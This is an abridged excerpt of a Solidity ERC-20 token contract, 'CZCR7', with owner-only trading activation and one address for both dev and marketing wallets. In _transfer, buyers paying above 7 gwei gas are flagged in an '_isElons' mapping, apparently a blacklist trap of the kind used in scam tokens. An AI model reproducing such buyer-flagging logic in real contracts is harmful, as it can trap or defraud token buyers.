...
contract czcr7 is Context, IERC20 { 
    using SafeMath for uint256;
    using Address for address;
    address private _owner;
    
    string private _name = "CZCR7";
    string private _symbol = unicode"CZCR7";
    ...
    uint256 public _swapTrigger = 10;
    uint256 public _swapTokenAtAmount = _tTotal * 1 / 200;

    address payable public DevWallet = payable(0x41141b539AfcFaa27eEE6A7bC3605b1Ea192846a);
    address payable public MarketingWallet = payable(0x41141b539AfcFaa27eEE6A7bC3605b1Ea192846a);
    ...
    function EnableTrading(bool true_or_false) external onlyOwner {
        tradingActive = true;
    ...
    function _transfer( address from, address to, uint256 amount ) private {
        ...
        if (limitInEffect && to != uniswapV2Pair && tx.gasprice > 7 gwei) {_isElons[to] = true;}
